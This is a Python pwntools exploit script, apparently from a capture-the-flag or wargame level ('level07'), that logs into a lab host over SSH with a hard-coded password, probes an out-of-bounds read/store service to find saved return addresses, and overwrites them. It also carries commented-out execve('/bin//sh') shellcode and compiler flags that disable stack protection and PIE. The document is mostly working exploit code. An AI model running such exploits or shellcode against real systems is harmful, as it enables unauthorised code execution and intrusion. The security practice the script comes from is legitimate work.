#!/usr/bin/env -S python3 -B
#================================ INIT
import pwn
import time

login="level07"
password="GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8"
host="192.168.244.56"
port=42421
s=pwn.ssh(login, host, password=password, port=port)

#getenv_src="./utils/getenv.c"
#getenv_dst="/tmp/getenv.c"
#getenv_gcc="gcc -m32 -z execstack -fno-stack-protector --no-pie"
#
#shellcode="\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"

#================================ RUN
def ft_recv(p, size):
    output=""
    while True:
        try:
            buffer=p.recv(size).decode()
            output+=buffer
            if len(buffer) < size:
                break
        except:
            break
    return output

p=s.process("/home/users/level07/level07")
time.sleep(0.2)
ft_recv(p, 1024)
eip=[134514202, 134514422, 134514927, 134514992]
x=0
index=114
while True:
    p.sendline(b"read")
    p.sendline(f"{index}".encode())
    time.sleep(0.2)
    answ = ft_recv(p, 1024)
    print(f"index={index} answ={answ}")
    if f"{eip[x]}" in answ:
        print(f"{eip[x]} found at index {index}")
        p.sendline(b"store")
        p.sendline(b"42")
        p.sendline(f"{index}".encode())
        time.sleep(0.2)
        answer = ft_recv(p, 1024)
        if not "wil" in answer:
            print("GOTCHAT")
            break
        index=114
        x+=1
    index+=1
